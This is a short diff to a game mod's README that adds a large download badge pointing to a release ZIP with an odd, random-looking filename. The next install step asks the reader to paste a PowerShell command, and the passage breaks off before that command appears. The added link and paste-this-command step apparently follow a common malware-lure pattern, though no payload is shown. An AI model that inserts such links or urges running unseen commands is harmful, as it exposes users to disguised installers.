@@ -20,6 +20,8 @@ It puts those code paths back on the game's own interpolation. The game's logic,
 
 ## Installation
 
+[![DOWNLOAD LATEST VERSION (.ZIP)](https://img.shields.io/badge/DOWNLOAD_LATEST_VERSION_(.ZIP)-black?style=for-the-badge&logo=github)](https://github.com/ZUENHZEI/Smooth-Motion-High-FPS-Fix/releases/download/mod/Smooth.Motion.BepInEx.Included.13.1.1.2026-10-15T17-16Z.AW0pamlgr.zip)
+
 1. Download and unpack ZIP archive 
 
 2. Paste this command into PowerShell to install the dependencies: 
